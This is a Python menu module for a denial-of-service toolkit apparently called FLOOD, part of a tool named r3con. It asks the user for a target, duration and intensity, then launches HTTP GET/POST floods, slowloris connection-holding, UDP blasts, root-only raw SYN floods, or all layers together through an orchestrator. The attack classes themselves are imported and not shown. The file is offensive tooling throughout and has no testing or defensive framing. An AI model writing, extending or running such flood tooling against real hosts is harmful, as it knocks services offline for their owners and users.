"""
Menu wiring for FLOOD. Called from r3con.py as `main`.
Asks which layer, target, duration; runs the orchestrator.
"""
import os
from .flood import FloodOrchestrator
from .http_flood import HTTPFlood
from .slowloris import Slowloris
from .udp_flood import UDPFlood
from .syn_flood import SYNFlood


def _ask(prompt, default=""):
    raw = input(f"  {prompt}" + (f" [{default}]" if default else "") + " > ").strip()
    return raw or default


def _raw_ok():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.close()
        return True
    except PermissionError:
        return False


def main():
    print("\n  FLOOD — pick a layer")
    print("  [1] http      — GET/POST flood (non-root)")
    print("  [2] slow      — slowloris header-hold (non-root)")
    print("  [3] udp       — UDP blast (non-root)")
    print("  [4] syn       — raw SYN flood (ROOT/CAP_NET_RAW only)")
    print("  [5] orchestrate — all available layers at once")
    print("  [0] back")
    while True:
        choice = input("  flood > ").strip()
        if choice == "0":
            return
        if choice not in ("1", "2", "3", "4", "5"):
            print("  bad slot")
            continue
        break

    if choice == "5":
        target = _ask("target url (http:// or https://)")
        dur = int(_ask("duration seconds", "60"))
        layers = ["http", "slow", "udp"]
        if _raw_ok():
            layers.append("syn")
        print(f"  layers: {layers}")
        out = FloodOrchestrator(target, dur, layers=tuple(layers)).run()
        print(f"\n  results: {out}")
        return

    if choice == "4":
        if not _raw_ok():
            print("  syn disabled — no raw capability (needs root)")
            return
        host = _ask("target host/ip")
        port = int(_ask("port", "80"))
        dur = int(_ask("duration", "30"))
        rate = int(_ask("packets/sec", "1500"))
        out = SYNFlood(host, port, dur, rate).run()
        print(f"  sent: {out}")
        return

    target = _ask("target url")
    dur = int(_ask("duration seconds", "60"))

    if choice == "1":
        workers = int(_ask("workers", "128"))
        method = _ask("method", "GET").upper()
        print(HTTPFlood(target, workers=workers, duration=dur, method=method).run())
    elif choice == "2":
        host = target.split("//")[-1].split("/")[0].split(":")[0]
        sockets = int(_ask("sockets", "400"))
        print(Slowloris(host, port=443 if "https" in target else 80,
                        sockets=sockets, duration=dur,
                        https="https" in target).run())
    elif choice == "3":
        host = target.split("//")[-1].split("/")[0].split(":")[0]
        threads = int(_ask("threads", "16"))
        print(UDPFlood(host, threads=threads, duration=dur).run())
